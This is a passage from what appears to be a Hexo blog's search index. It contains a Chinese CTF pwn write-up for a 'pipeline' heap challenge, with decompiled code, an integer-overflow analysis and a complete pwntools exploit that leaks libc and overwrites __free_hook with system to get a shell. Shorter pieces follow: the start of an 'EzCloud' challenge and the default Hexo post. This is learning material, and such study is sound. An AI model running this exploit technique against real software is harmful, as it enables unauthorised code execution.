class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2-&gt;size = <span class="number">0</span>;</span><br><span class="line">      v2-&gt;malloc_addr = <span class="number">0LL</span>;</span><br><span class="line">      result = v2;</span><br><span class="line">      v2-&gt;offset = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这里我们来复习一下realloc函数：</li></ul><blockquote><p><code>void *realloc (void *ptr, size_t new_size );</code></p><p><code>realloc</code>函数用于修改一个原先已经分配的内存块的大小，可以使一块内存的扩大或缩小。当起始空间的地址为空，即<code>*ptr = NULL</code>,则同<code>malloc</code>。当<code>*ptr</code>非空：若<code>nuw_size &lt; size</code>,即缩小<code>*ptr</code>所指向的内存空间，该内存块尾部的部分内存被拿掉，剩余部分内存的原先内容依然保留；若<code>nuw_size &gt; size</code>,即扩大<code>*ptr</code>所指向的内存空间，如果原先的内存尾部有足够的扩大空间，则直接在原先的内存块尾部新增内存，如果原先的内存尾部空间不足，或原先的内存块无法改变大小，<code>realloc</code>将重新分配另一块<code>new_size</code>大小的内存，并把原先那块内存的内容复制到新的内存块上。因此，使用<code>realloc</code>后就应该改用<code>realloc</code>返回的新指针。</p></blockquote><ul><li>实际上这里的堆块结构如下图：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x56134a4822b0:0x00000000000000000x0000000000000021</span><br><span class="line">0x56134a4822c0:0x00000000000000000x0000000000000000 malloc_addr, size offset</span><br><span class="line">0x56134a4822d0:0x000056134a4822e00x0000000000000021 next_ptr</span><br><span class="line">0x56134a4822e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x56134a4822f0:0x000056134a4823000x0000000000000021</span><br></pre></td></tr></table></figure><ul><li><p><strong>也就是说，当我们add函数申请chunk时，<code>malloc_addr</code>和<code>size</code>、<code>offset</code>是不初始化的。而他们的初始化是在edit函数进行的。后面的append和show函数是对malloc_addr上存储的堆进行操作的，destory函数则是对链式结构堆进行操作的。</strong></p></li><li><p>回过头来看到初始化函数：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_1288</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  qword_4050 = (__int64)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);<span class="comment">// 第一个申请的堆块地址</span></span><br><span class="line">  *(_QWORD *)qword_4050 = qword_4050 + <span class="number">16</span>;<span class="comment">// 堆中前8位字符存放着qword_4050 + 16</span></span><br><span class="line">  *(_QWORD *)(qword_4050 + <span class="number">8</span>) = <span class="number">0x21000</span>LL;<span class="comment">// 后8位字符存放着整个内存的大小0x21000</span></span><br><span class="line">  <span class="keyword">return</span> alarm(<span class="number">0x78</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>checkerr函数，需要保证申请的堆块不能超出初始化的第一个堆块地址到0x21000的范围：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_1332</span><span class="params">(<span class="keyword">unsigned</span> __int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; *(_QWORD *)qword_4050 || (result = *(_QWORD *)qword_4050 + *(_QWORD *)(qword_4050 + <span class="number">8</span>), a1 &gt;= result) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>destory函数，只是一个脱链操作，并没有真正的free掉：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct pipe *__fastcall <span class="title">sub_178A</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">v4</span>;</span> <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = sub_1540(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  result = sub_1651(v3, a2);<span class="comment">// 取第v3个堆块的指针函数，但是要保证链不能断</span></span><br><span class="line">  v4 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( result == qword_4058 )</span><br><span class="line">      qword_4058 = result-&gt;next_ptr;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_1651((v3 - <span class="number">1</span>), a2)-&gt;next_ptr = result-&gt;next_ptr;<span class="comment">// 将next_ptr指针赋值给前一个</span></span><br><span class="line">    sub_1422(v4-&gt;malloc_addr);</span><br><span class="line">    <span class="keyword">return</span> sub_1422(v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>append函数，这里存在整型溢出，如果v5取一个负数，那么就可以绕过验证，这样就可以扩大v3的值，实现数组溢出：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct pipe *__fastcall <span class="title">sub_1819</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">v6</span>;</span> <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_1540(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  result = sub_1651(v4, a2);</span><br><span class="line">  v6 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    result = result-&gt;malloc_addr;</span><br><span class="line">    <span class="keyword">if</span> ( v6-&gt;malloc_addr )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = sub_1540(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">      v3 = v6-&gt;size - v6-&gt;offset;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &lt;= v3 )<span class="comment">// 如果要输入的大小小于size - offset，存在整型溢出</span></span><br><span class="line">        LOWORD(v3) = v5;<span class="comment">// loword取出低16位</span></span><br><span class="line">      <span class="keyword">return</span> sub_1453(&amp;v6-&gt;malloc_addr[v6-&gt;offset], v3);<span class="comment">// 从offset处继续开始写</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>show函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_18B9</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">v2</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">v5</span>;</span> <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_1540(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  v2 = sub_1651(v4, a2);</span><br><span class="line">  v5 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = v2-&gt;malloc_addr;</span><br><span class="line">    <span class="keyword">if</span> ( v5-&gt;malloc_addr )</span><br><span class="line">      LODWORD(v2) = <span class="built_in">printf</span>(<span class="string">&quot;data: %s\n&quot;</span>, &amp;v5-&gt;malloc_addr[v5-&gt;offset]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>思路：<ul><li>由于没有free函数，我们需要使用<code>realloc(0)</code>替代。</li><li>先使用edit函数申请一个0x400以上的堆块，free成为unsorted bin后，再申请回来，从而泄露libc地址。</li><li>输入一个负数实现数组溢出，这里输入的是<code>-0x7fffff00</code>，在计算机中表示为<code>0x7fffff00</code>的补码，即<code>0x8000100</code>，绕过检测后取低16位，即赋值<code>v3</code>为0x100，可以读入0x100个字符。</li><li>数组溢出后可以改写下一个链式结构，包括其<code>malloc_addr</code>地址，最后实现任意地址写，将<code>__free_hook</code>地址改写为<code>system</code>函数地址。</li></ul></li><li>脚本：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pipeline&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pipeline&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">   cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   init-pwndbg</span></span><br><span class="line"><span class="string">   &#x27;&#x27;&#x27;</span></span><br><span class="line">   gdb.attach(sh, cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">cho</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(cho))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">   choice(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, offset, size</span>):</span></span><br><span class="line">   choice(<span class="number">2</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;offset: &#x27;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destory</span>(<span class="params">idx</span>):</span></span><br><span class="line">   choice(<span class="number">3</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">append</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">   choice(<span class="number">4</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;data: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">   choice(<span class="number">5</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add() <span class="comment"># 0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x1000</span>)</span><br><span class="line">add() <span class="comment"># 1 防止合并到top chunk</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x1000</span>) </span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;data: &#x27;</span>)</span><br><span class="line">libc.address = u64(sh.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">add() <span class="comment"># 2</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0xff</span>, <span class="number">0x100</span>)</span><br><span class="line">add() <span class="comment"># 3</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">add() <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">append(<span class="number">4</span>, <span class="number">0x40</span>, <span class="string">&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">append(<span class="number">2</span>, -<span class="number">0x7fffff00</span>, flat([<span class="string">&#x27;a&#x27;</span>, <span class="number">0</span>, <span class="number">0x21</span>, libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>], <span class="string">&#x27;\n&#x27;</span>]))</span><br><span class="line">append(<span class="number">3</span>, <span class="number">0x30</span>, flat([libc.sym[<span class="string">&#x27;system&#x27;</span>], <span class="string">&#x27;\n&#x27;</span>]))</span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="EzCloud"><a href="#EzCloud" class="headerlink" title="EzCloud"></a>EzCloud</h3><ul><li>这是一道虚拟化方向的题目，参考链接：<a href="https://matshao.com/2021/06/15/QWB2021-Quals-EzCloud/">https://matshao.com/2021/06/15/QWB2021-Quals-EzCloud/</a></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+4h] [rbp-5Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  __int64 buf[<span class="number">10</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">9</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_1463(a1, a2, a3);</span><br><span class="line">  alarm(<span class="number">0x168</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">    sub_9292(&amp;s2, <span class="number">64LL</span>, buf);</span><br><span class="line">    v6 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v6 &lt;= <span class="number">0x3F</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      read(fd, buf, <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( ((*__ctype_b_loc())[SLOBYTE(buf[<span class="number">0</span>])] &amp; <span class="number">0x1000</span>) != <span class="number">0</span> )</span><br><span class="line">        *((_BYTE *)s2 + v6++) = buf[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    ::fd = open(<span class="string">&quot;/dev/NULL&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    v5 = fcntl(<span class="number">0</span>, <span class="number">3</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;F_GETFL error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( fcntl(<span class="number">0</span>, <span class="number">4</span>, v5 | <span class="number">0x800</span>u) &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;F_SETFL error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      sub_8BB9();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/10/09/hello-world/"/>
      <url>/2021/10/09/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
